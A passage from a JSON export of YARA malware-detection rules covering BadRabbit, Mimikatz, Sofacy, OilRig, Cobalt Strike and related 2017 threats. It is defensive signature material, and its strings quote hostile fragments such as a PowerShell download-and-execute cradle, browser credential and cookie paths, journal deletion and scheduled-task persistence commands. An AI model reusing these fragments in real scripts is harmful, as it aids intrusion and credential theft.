rhaegal /TR \\\"%ws /C Start \\\\\\\"\\\\\\\" \\\\\\\"%wsdispci.exe\\\\\\\"\" fullword wide\n      $x3 = \"C:\\\\Windows\\\\infpub.dat\" fullword wide\n      $x4 = \"C:\\\\Windows\\\\cscc.dat\" fullword wide\n      $s1 = \"need to do is submit the payment and get the decryption password.\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\GLOBALROOT\\\\ArcName\\\\multi(0)disk(0)rdisk(0)partition(1)\" fullword wide\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n      $s4 = \"fsutil usn deletejournal /D %c:\" fullword wide\n      $s5 = \"Run DECRYPT app at your desktop after system boot\" fullword ascii\n      $s6 = \"Files decryption completed\" fullword wide\n      $s7 = \"Disable your anti-virus and anti-malware programs\" fullword wide\n      $s8 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\%ws\" fullword wide\n      $s9 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n      $s10 = \"%ws C:\\\\Windows\\\\%ws,#1 %ws\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2017-10-25 09:26:01","description":"Detects BadRabbit Ransomware","minimum_yara":"1.7","name":"BadRabbit_Gen_RID2BE5","reference":"https://pastebin.com/Y7pJv3tK","required_modules":[],"rule_hash":"e4f9f3800e9d0ed564396a1dee1742c1","score":75,"tags":["T1050","RANSOM","MAL","DEMO","EXE","T1053","FILE","T1085","GEN","CRIME"]},{"author":"Florian Roth","content":"rule BadRabbit_Mimikatz_Comp_RID2FFF : DEMO EXE FILE MAL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Semiautomatic generated rule - file 2f8c54f9fa8e47596a3beff0031f85360e56840c77f71c6a573ace6f46412035\"\n      author = \"Florian Roth\"\n      reference = \"https://pastebin.com/Y7pJv3tK\"\n      date = \"2017-10-25 12:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%lS%lS%lS:%lS\" fullword wide\n      $s2 = \"lsasrv\" fullword wide\n      $s3 = \"CredentialKeys\" ascii\n      $s4 = { 50 72 69 6D 61 72 79 00 6D 00 73 00 76 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them )\n}","date":"2017-10-25 12:21:01","description":"Semiautomatic generated rule - file 2f8c54f9fa8e47596a3beff0031f85360e56840c77f71c6a573ace6f46412035","minimum_yara":"1.7","name":"BadRabbit_Mimikatz_Comp_RID2FFF","reference":"https://pastebin.com/Y7pJv3tK","required_modules":[],"rule_hash":"5021ac0ae32441f76b7784a2f2754269","score":75,"tags":["T1178","T1097","MAL","T1075","DEMO","T1003","FILE","EXE"]},{"author":"Florian Roth","content":"rule KasperMalware_Oct17_1_RID2EBD : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kasper Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-10-24 11:27:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\kasper.pdb\" ascii\n      $x2 = \"C:\\\\D@oc@um@en@ts a@nd Set@tings\\\\Al@l Users\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( pe.imphash ( ) == \"2bceb64cf37acd34bc33b38f2cddfb61\" or 1 of them )\n}","date":"2017-10-24 11:27:21","description":"Detects Kasper Backdoor","minimum_yara":"1.7","name":"KasperMalware_Oct17_1_RID2EBD","reference":"Internal Research","required_modules":["pe"],"rule_hash":"c0ce02ce76760d2dd96578f688af2822","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Sofacy_Oct17_1_RID2BF3 : APT DEMO EXE FILE RUSSIA T1085 {\n   meta:\n      description = \"Detects Sofacy malware reported in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n      date = \"2017-10-23 09:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA, T1085\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%localappdata%\\\\netwf.dll\" fullword wide\n      $x2 = \"set path = \\\"%localappdata%\\\\netwf.dll\\\"\" fullword ascii\n      $x3 = \"%localappdata%\\\\netwf.bat\" fullword wide\n      $x4 = \"KlpSvc.dll\" fullword ascii\n      $g1 = \"set path = \\\"%localappdata%\\\\\" ascii\n      $g2 = \"%localappdata%\\\\\" wide\n      $s1 = \"start rundll32.exe %path %,#1a\" fullword ascii\n      $s2 = \"gshell32\" fullword wide\n      $s3 = \"s - %lu\" fullword ascii\n      $s4 = \"be run i\" fullword ascii\n      $s5 = \"ingToBinhary\" fullword ascii\n      $s6 = \"%j%Xjs\" fullword ascii\n      $s7 = \"if NOT exist %path % (exit)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports ( \"KlpSvc\" ) or ( 1 of ( $x* ) or 4 of them ) or ( $s1 and all of ( $g* ) ) )\n}","date":"2017-10-23 09:28:21","description":"Detects Sofacy malware reported in October 2017","minimum_yara":"1.7","name":"Sofacy_Oct17_1_RID2BF3","reference":"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html","required_modules":["pe"],"rule_hash":"e7843dbb6e25d553856ac1e727a85dba","score":75,"tags":["T1085","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_Oct17_2_RID2BF4 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects Sofacy malware reported in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n      date = \"2017-10-23 09:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"netwf.dll\" fullword wide\n      $s1 = \"%s - %s - %2.2x\" fullword wide\n      $s2 = \"%s - %lu\" fullword ascii\n      $s3 = \"%s \\\"%s\\\", %s\" fullword wide\n      $s4 = \"%j%Xjsf\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == \"13344e2a717849489bcd93692f9646f7\" or ( 4 of them ) ) ) or ( all of them )\n}","date":"2017-10-23 09:28:31","description":"Detects Sofacy malware reported in October 2017","minimum_yara":"1.7","name":"Sofacy_Oct17_2_RID2BF4","reference":"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html","required_modules":["pe"],"rule_hash":"01fa400317774bee99273b16214bfb17","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule TA17_293A_Hacktool_PS_1_RID2E72 : APT DEMO HKTL T1086 {\n   meta:\n      description = \"Semiautomatic generated rule - file 72a28efb6e32e653b656ca32ccd44b3111145a695f6f6161965deebbdc437076\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 11:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=f\" ascii\n      $x2 = \"} | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments\" fullword ascii\n   condition: \n      ( filesize < 80KB and 1 of them )\n}","date":"2017-10-21 11:14:51","description":"Semiautomatic generated rule - file 72a28efb6e32e653b656ca32ccd44b3111145a695f6f6161965deebbdc437076","minimum_yara":"1.7","name":"TA17_293A_Hacktool_PS_1_RID2E72","reference":"https://www.us-cert.gov/ncas/alerts/TA17-293A","required_modules":[],"rule_hash":"30d6588fb949da248592a7e6e35ae7a5","score":75,"tags":["APT","DEMO","T1086","HKTL"]},{"author":"Florian Roth","content":"rule TA17_293A_Hacktool_Touch_MAC_modification_RID35C7 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file 070d7082a5abe1112615877214ec82241fd17e5bd465e24d794a470f699af88e\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 16:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-t time - use the time specified to update the access and modification times\" fullword ascii\n      $s2 = \"Failed to set file times for %s. Error: %x\" fullword ascii\n      $s3 = \"touch [-acm][ -r ref_file | -t time] file...\" fullword ascii\n      $s4 = \"-m - change the modification time only\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-10-21 16:27:41","description":"Semiautomatic generated rule - file 070d7082a5abe1112615877214ec82241fd17e5bd465e24d794a470f699af88e","minimum_yara":"1.7","name":"TA17_293A_Hacktool_Touch_MAC_modification_RID35C7","reference":"https://www.us-cert.gov/ncas/alerts/TA17-293A","required_modules":[],"rule_hash":"503935641379608c91828dae522a88fd","score":75,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule TA17_293A_Hacktool_Exploit_MS16_032_RID327E : APT DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file 9b97290300abb68fb48480718e6318ee2cdd4f099aa6438010fb2f44803e0b58\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 14:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread)))\" ascii\n      $x2 = \"0x00000002, \\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\", \\\"\\\",\" fullword ascii\n      $x3 = \"PowerShell implementation of MS16-032. The exploit targets all vulnerable\" fullword ascii\n      $x4 = \"If we can't open the process token it's a SYSTEM shell!\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them )\n}","date":"2017-10-21 14:07:31","description":"Semiautomatic generated rule - file 9b97290300abb68fb48480718e6318ee2cdd4f099aa6438010fb2f44803e0b58","minimum_yara":"1.7","name":"TA17_293A_Hacktool_Exploit_MS16_032_RID327E","reference":"https://www.us-cert.gov/ncas/alerts/TA17-293A","required_modules":[],"rule_hash":"af8e49c50dab76951d47787644989925","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Imphash_UPX_Packed_Malware_1_TA17_293A_RID3430 : APT DEMO EXE FILE MAL T1045 {\n   meta:\n      description = \"Detects malware based on Imphash of malware used in TA17-293A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 15:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1045\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == \"d7d745ea39c8c5b82d5e153d3313096c\" )\n}","date":"2017-10-21 15:19:51","description":"Detects malware based on Imphash of malware used in TA17-293A","minimum_yara":"1.7","name":"Imphash_UPX_Packed_Malware_1_TA17_293A_RID3430","reference":"https://www.us-cert.gov/ncas/alerts/TA17-293A","required_modules":["pe"],"rule_hash":"f46a879344bf8363971337532a15b20c","score":75,"tags":["MAL","DEMO","FILE","APT","T1045","EXE"]},{"author":"Florian Roth","content":"rule Imphash_Malware_2_TA17_293A_RID302E : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware based on Imphash of malware used in TA17-293A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 12:28:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == \"a8f69eb2cf9f30ea96961c86b4347282\" )\n}","date":"2017-10-21 12:28:51","description":"Detects malware based on Imphash of malware used in TA17-293A","minimum_yara":"1.7","name":"Imphash_Malware_2_TA17_293A_RID302E","reference":"https://www.us-cert.gov/ncas/alerts/TA17-293A","required_modules":["pe"],"rule_hash":"16fbc1efbb567029ac6c5d41a6e1b7b0","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WinAgent_BadPatch_1_RID2E14 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples mentioned in BadPatch report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/RvDwwA\"\n      date = \"2017-10-20 10:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"J:\\\\newPatch\\\\downloader\\\\\" wide\n      $x2 = \"L:\\\\rashed\\\\New code\\\\\" wide\n      $x3 = \":\\\\newPatch\\\\last version\\\\\" wide\n      $x4 = \"\\\\Microsoft\\\\Microsoft\\\\Microsoft1.log\" fullword wide\n      $x5 = \"\\\\Microsoft\\\\Microsoft\\\\Microsoft.log\" fullword wide\n      $x6 = \"\\\\Microsoft\\\\newPP.exe\" fullword wide\n      $x7 = \" (this is probably a proxy server error).\" fullword wide\n      $x8 = \" :Old - update patch and check anti-virus.. \" fullword wide\n      $x9 = \"PatchNotExit-- download now.. \" fullword wide\n      $x10 = \"PatchNotExit-- Check Version\" fullword wide\n      $x11 = \"PatchNotExit-- Version Patch\" fullword wide\n      $s1 = \"downloader \" fullword wide\n      $s2 = \"DelDownloadFile\" fullword ascii\n      $s3 = \"downloadFile\" fullword ascii\n      $s4 = \"downloadUpdate\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of them ) )\n}","date":"2017-10-20 10:59:11","description":"Detects samples mentioned in BadPatch report","minimum_yara":"1.7","name":"WinAgent_BadPatch_1_RID2E14","reference":"https://goo.gl/RvDwwA","required_modules":[],"rule_hash":"b3cbff0ebcf22563407abd2e2ebe69f8","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WinAgent_BadPatch_2_RID2E15 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples mentioned in BadPatch report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/RvDwwA\"\n      date = \"2017-10-20 10:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"myAction=shell_result&serialNumber=\" fullword wide\n      $s2 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data.*\" fullword wide\n      $s3 = \"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword wide\n      $s4 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies.*\" fullword wide\n      $s5 = \"newSHELL[\" fullword wide\n      $s6 = \"\\\\file1.txt\" fullword wide\n      $s7 = \"myAction=newGIF&serialNumber=\" fullword wide\n      $s8 = \"\\\\Storege1\" fullword wide\n      $s9 = \"\\\\Microsoft\\\\mac.txt\" fullword wide\n      $s10 = \"spytube____:\" fullword ascii\n      $s11 = \"0D0700045F5C5B0312045A04041F40014B1D11004A1F19074A141100011200154B031C04\" fullword wide\n      $s12 = \"16161A1000012B162503151851065A1A0007\" fullword wide\n      $s13 = \"-- SysFile....\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 3 of them )\n}","date":"2017-10-20 10:59:21","description":"Detects samples mentioned in BadPatch report","minimum_yara":"1.7","name":"WinAgent_BadPatch_2_RID2E15","reference":"https://goo.gl/RvDwwA","required_modules":[],"rule_hash":"c559f8ce3011b8844b13655544dcc14f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SeDLL_Javascript_Decryptor_RID3136 : APT DEMO EXE FILE MAL T1117 {\n   meta:\n      description = \"Detects SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/MZ7dRg\"\n      date = \"2017-10-18 13:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SEDll_Win32.dll\" fullword ascii\n      $x2 = \"regsvr32 /s \\\"%s\\\" DR __CIM__\" fullword wide\n      $s1 = \"WScriptW\" fullword ascii\n      $s2 = \"IWScript\" fullword ascii\n      $s3 = \"%s\\\\%s~%d\" fullword wide\n      $s4 = \"PutBlockToFileWW\" fullword ascii\n      $s5 = \"CheckUpAndDownWW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2017-10-18 13:12:51","description":"Detects SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz","minimum_yara":"1.7","name":"SeDLL_Javascript_Decryptor_RID3136","reference":"https://goo.gl/MZ7dRg","required_modules":[],"rule_hash":"fba106c49d4ff77baa3b6a9fb38fe6d8","score":75,"tags":["MAL","DEMO","EXE","FILE","APT","T1117"]},{"author":"Florian Roth","content":"rule Leviathan_CobaltStrike_Sample_1_RID3324 : APT DEMO EXE FILE T1075 T1105 {\n   meta:\n      description = \"Detects Cobalt Strike sample from Leviathan report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/MZ7dRg\"\n      date = \"2017-10-18 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1075, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"a54c81.dll\" fullword ascii\n      $x2 = \"%d is an x64 process (can't inject x86 content)\" fullword ascii\n      $x3 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n      $s1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $s2 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $s3 = \"could not run command (w/ token) because of its length of %d bytes!\" fullword ascii\n      $s4 = \"could not write to process memory: %d\" fullword ascii\n      $s5 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n      $s6 = \"Could not connect to pipe (%s): %d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2017-10-18 14:35:11","description":"Detects Cobalt Strike sample from Leviathan report","minimum_yara":"1.7","name":"Leviathan_CobaltStrike_Sample_1_RID3324","reference":"https://goo.gl/MZ7dRg","required_modules":[],"rule_hash":"fcb16c7097fd700ecbf53244e561baa4","score":75,"tags":["T1075","DEMO","FILE","APT","EXE","T1105"]},{"author":"Florian Roth","content":"rule MockDll_Gen_RID2B30 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects MockDll - regsvr DLL loader\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/MZ7dRg\"\n      date = \"2017-10-18 08:55:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mock_run_ini_Win32.dll\" fullword ascii\n      $x2 = \"mock_run_ini_x64.dll\" fullword ascii\n      $s1 = \"RealCmd=%s %s\" fullword ascii\n      $s2 = \"MockModule=%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2017-10-18 08:55:51","description":"Detects MockDll - regsvr DLL loader","minimum_yara":"1.7","name":"MockDll_Gen_RID2B30","reference":"https://goo.gl/MZ7dRg","required_modules":[],"rule_hash":"0c4a1759c9d121f5ed77bf35c280a424","score":75,"tags":["APT","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule VBScript_Favicon_File_RID2F22 : APT DEMO FILE SCRIPT T1170 {\n   meta:\n      description = \"VBScript cloaked as Favicon file used in Leviathan incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/MZ7dRg\"\n      date = \"2017-10-18 11:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, SCRIPT, T1170\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"myxml = '<?xml version=\\\"\\\"1.0\\\"\\\" encoding=\\\"\\\"UTF-8\\\"\\\"?>';myxml = myxml +'<root>\" ascii\n      $x2 = \".Run \\\"taskkill /im mshta.exe\" ascii\n      $x3 = \"<script language=\\\"VBScript\\\">Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 :\" ascii\n      $s1 = \".ExpandEnvironmentStrings(\\\"%ALLUSERSPROFILE%\\\") &\" fullword ascii\n      $s2 = \".ExpandEnvironmentStrings(\\\"%temp%\\\") & \" ascii\n   condition: \n      filesize < 100KB and ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2017-10-18 11:44:11","description":"VBScript cloaked as Favicon file used in Leviathan incident","minimum_yara":"1.7","name":"VBScript_Favicon_File_RID2F22","reference":"https://goo.gl/MZ7dRg","required_modules":[],"rule_hash":"548165824a2ddeb6c693174bdfc84139","score":75,"tags":["APT","DEMO","SCRIPT","FILE","T1170"]},{"author":"Florian Roth","content":"rule OilRig_Strings_Oct17_RID2E8D : APT DEMO MIDDLE_EAST {\n   meta:\n      description = \"Detects strings from OilRig malware and malicious scripts\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/\"\n      date = \"2017-10-18 11:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%localappdata%\\\\srvHealth.exe\" fullword wide ascii\n      $x2 = \"%localappdata%\\\\srvBS.txt\" fullword wide ascii\n      $x3 = \"Agent Injector\\\\PolicyConverter\\\\Inner\\\\obj\\\\Release\\\\Inner.pdb\" fullword ascii\n      $x4 = \"Agent Injector\\\\PolicyConverter\\\\Joiner\\\\obj\\\\Release\\\\Joiner.pdb\" fullword ascii\n      $s3 = \".LoadDll(\\\"Run\\\", arg, \\\"C:\\\\\\\\Windows\\\\\\\\\" ascii\n   condition: \n      filesize < 800KB and 1 of them\n}","date":"2017-10-18 11:19:21","description":"Detects strings from OilRig malware and malicious scripts","minimum_yara":"1.7","name":"OilRig_Strings_Oct17_RID2E8D","reference":"https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/","required_modules":[],"rule_hash":"079ee4f1e4bcee26ccf04e7975722404","score":75,"tags":["APT","DEMO","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule OilRig_ISMAgent_Campaign_Samples1_RID3372 : APT DEMO FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects OilRig malware from Unit 42 report in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JQVfFP\"\n      date = \"2017-10-18 14:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"###$$$TVqQAAMAAAAEAAAA\" ascii\n      $s2 = \"C:\\\\Users\\\\J-Win-7-32-Vm\\\\Desktop\\\\error.jpg\" fullword wide\n      $s3 = \"$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes(\" ascii\n      $s4 = \" /c echo powershell > \" fullword wide ascii\n      $s5 = \"\\\\Libraries\\\\servicereset.exe\" fullword wide\n      $s6 = \"%DestFolder%\" fullword wide ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 2 of them\n}","date":"2017-10-18 14:48:11","description":"Detects OilRig malware from Unit 42 report in October 2017","minimum_yara":"1.7","name":"OilRig_ISMAgent_Campaign_Samples1_RID3372","reference":"https://goo.gl/JQVfFP","required_modules":[],"rule_hash":"7b036ceda3addf668d6ec6ffbf3b54b2","score":75,"tags":["APT","DEMO","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule OilRig_ISMAgent_Campaign_Samples2_RID3373 : APT DEMO EXE FILE MIDDLE_EAST T1121 {\n   meta:\n      description = \"Detects OilRig malware from Unit 42 report in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JQVfFP\"\n      date = \"2017-10-18 14:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1121\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PolicyConverter.exe\" fullword wide\n      $x2 = \"SrvHealth.exe\" fullword wide\n      $x3 = \"srvBS.txt\" fullword wide\n      $s1 = \"{a3538ba3-5cf7-43f0-bc0e-9b53a98e1643}, PublicKeyToken=3e56350693f7355e\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\RegAsm.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 2 of ( $x* ) or 3 of them )\n}","date":"2017-10-18 14:48:21","description":"Detects OilRig malware from Unit 42 report in October 2017","minimum_yara":"1.7","name":"OilRig_ISMAgent_Campaign_Samples2_RID3373","reference":"https://goo.gl/JQVfFP","required_modules":[],"rule_hash":"266f86b0829436fd5044ab1baf2f43fe","score":75,"tags":["T1121","DEMO","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Florian Roth","content":"rule OilRig_ISMAgent_Campaign_Samples3_RID3374 : APT DEMO EXE FILE MIDDLE_EAST T1053 {\n   meta:\n      description = \"Detects OilRig malware from Unit 42 report in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JQVfFP\"\n      date = \"2017-10-18 14:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1053\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd /c schtasks /query /tn TimeUpdate > NUL 2>&1\" ascii\n      $x2 = \"schtasks /create /sc minute /mo 0002 /tn TimeUpdate /tr\" fullword ascii\n      $x3 = \"-c  SampleDomain.com -m scheduleminutes\" fullword ascii\n      $x4 = \".ntpupdateserver.com\" fullword ascii\n      $x5 = \".msoffice365update.com\" fullword ascii\n      $s1 = \"out.exe\" fullword ascii\n      $s2 = \"\\\\Win32Project1\\\\Release\\\\Win32Project1.pdb\" ascii\n      $s3 = \"C:\\\\windows\\\\system32\\\\cmd.exe /c (\" fullword ascii\n      